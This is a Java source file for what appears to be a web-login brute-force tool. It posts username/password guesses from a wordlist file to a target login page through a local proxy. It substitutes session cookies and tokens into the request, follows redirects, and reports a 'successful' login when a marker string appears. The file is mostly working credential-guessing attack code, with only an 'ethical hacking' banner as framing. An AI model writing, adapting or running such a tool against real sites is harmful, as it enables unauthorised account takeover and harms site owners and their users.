package processHtml;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
import java.net.URLEncoder;
import java.util.LinkedList;

class Pass{
	
	String post;
	String password;
	String username;
	String login_page;
	String filename;
	String login_cookie;
	String login_iden;
	
	// Basic Constructor
	/**
	 * 
	 * @param post Its the post that you need to POST to the web-site.
	 * @param username The username used in the post to attempt the login
	 * @param password It stores the password for the thread that is running. 
	 * This is required in order to be able to print the password and let 
	 * the user know which one has passed 	
	 * @param site The site where the POST is to be made.
	 * @param filename The filename where the passwords are stored. These 
	 * stored passwords are used for the brute force
	 * @param login_cookie The format of the cookie required for the POST 
	 * to be successful.
	 */
	public Pass(String post ,String username, String password , String login_page,
			String filename, String login_cookie, String login_iden)
	{
		this.password = password;
		this.post = post;
		this.username = username;
		this.login_page = login_page;
		this.filename = filename;
		this.login_cookie = login_cookie;
		this.login_iden = login_iden;
	}
	//Default Constructor
	public Pass()
	{
		new Pass(null, null, null, null, null, null, null);
	}
	
	/**
	 * Here I need to create a new method that will basically give me the
	 * chance to get and store the html and then I will need to write a 
	 * function that will let me parse the html or figure out a way whether
	 * we are logged in or not
	 * 
	 * This function just connects and store the html in a file like I did earlier.
	 * The first time when I started the project.
	 * @throws Exception 
	 */
	
		public boolean getPostLoginHtml(String post, String username, 
				String password,String login_page, String filename, 
				String login_cookie, String login_iden) throws Exception
			{	
			HttpURLConnection.setFollowRedirects(false);
			String docu = "" ;
			
			// Encode all that requires to be encoded , usually only the username an 
			// password.
			
			password = URLEncoder.encode(password , "UTF-8");
			username = URLEncoder.encode(username, "UTF-8");
			
			URL url = new URL(login_page);
			
			Proxy proxy = new Proxy(Proxy.Type.HTTP, 
					new InetSocketAddress("127.0.0.1", 8080));
			HttpURLConnection connection  = (HttpURLConnection) url.openConnection(proxy);
			connection.setDoInput(true);
			connection.setDoOutput(true);
			
			connection.setRequestMethod("POST");
			String cookie1 = login_cookie, key = login_cookie;
			
			HttpURLConnection conn = (HttpURLConnection)url.openConnection(proxy);
			/*
			 * Here I need to check the percentage signs in the post and the cookies 
			 * and replace the expression "%%%....%%%" by whatever is required to be in
			 * there.
			 */
			while(post.contains("%%%") )
			{
				String x = post.substring(post.indexOf("%%%")+ 3);
				x = x.substring(0, x.indexOf("%%%"));
				String val = UtilityPasswdTest.getPHPSSID(conn, x);
				post = post.replace("%%%"+x+"%%%", val);
			}
			while(cookie1.contains("%%%"))
			{
				key = login_cookie.substring(login_cookie.indexOf("%%%")+3);
				key = key.substring(0, key.indexOf("%%%"));
				cookie1 = UtilityPasswdTest.getPHPSSID(conn, key);
				cookie1 = login_cookie.replace("%%%"+key+"%%%", cookie1);
			}
			connection.setRequestProperty("Cookie", cookie1);
			
			OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream());
			writer.write(post);
						
			writer.flush();
			writer.close();
			
			int responseCode = connection.getResponseCode();
			
			System.out.println(cookie1);
			
			if(responseCode == 302)
			{
			
				String cookie2 = login_cookie;
				String key2 = login_cookie;
				while(cookie2.contains("%%%"))
				{
					key2 = login_cookie.substring(login_cookie.indexOf("%%%")+3);
					key2 = key2.substring(0, key2.indexOf("%%%"));
					cookie2 = UtilityPasswdTest.getPHPSSID(connection, key2);
					cookie2 = login_cookie.replace("%%%"+key2+"%%%", cookie2);
				}
				System.out.println(cookie2);
				
				int i = 1;
				String base_site = "";
				String location = connection.getHeaderField("Location");
				if(!location.contains("http"))
				{
					base_site = login_page.substring(0, login_page.lastIndexOf('/')+1);
					
				}
				// Now I have the base site and the cookie its now time to create the second
				// connection and get the response.
				String site2 = base_site+""+location;
				URL url2 = new URL(site2);		
				System.out.println(site2);
				while(!connection.getHeaderFieldKey(i).contains("Cookie"))
				{
					i++;
				}
				HttpURLConnection connection2 = (HttpURLConnection)url2.openConnection(proxy);
				
				connection2.setRequestProperty("Cookie", cookie2);
				
				connection2.getResponseCode();
				
				InputStreamReader ins = new InputStreamReader(connection2.getInputStream());
				BufferedReader br = new BufferedReader(ins);
				String str = "";
				while((str = br.readLine()) != null)
				{
					docu += str+"\n";
				}
				connection2.disconnect();
				connection.disconnect();
				System.out.println("Within the 302 section");
				
			}
			else
			{
				InputStreamReader ins = new InputStreamReader(connection.getInputStream());
				BufferedReader br = new BufferedReader(ins);
				String str = "";
				while((str = br.readLine()) != null)
				{
					docu += str+"\n";
				}	
				connection.disconnect();
			}
			
			//Look for html parsers
			if(docu.contains(login_iden))
			{
				System.out.println("=================================================================================");
				System.out.println("Awesome, It works !!!!!");
				System.out.println();
				System.out.println("Login successfull, "+"The username is \""+username+"\" and your password is \""+ password+"\".");
				System.out.println();
				System.out.println("			HAPPY ETHICAL HACKING");
				System.out.println("			    :>			");
				System.out.println("=================================================================================");
				connection.disconnect();
				return true;
			}
			else
			{
				System.out.println("Attempt failed with username \""+username+ "\" and password \""+password+"\".");
				return false;
			}
			// ===============================================
		}
		
		/*
		 * This method is meant for converting a file that contains the
		 * passwords or the user name into a linked list that may be later 
		 * on used for other purposes.
		 */
		public static LinkedList<String> makeListFromFile(String filename) throws Exception
		{
			LinkedList<String> list  = new LinkedList<String>();
			DataInputStream dis = new DataInputStream(new FileInputStream(filename));
			BufferedReader reader = new BufferedReader(new InputStreamReader(dis));
			String str = "";
			while((str = reader.readLine()) != null)
			{
				list.add(str);
			}
			reader.close();
			return list;
		}

}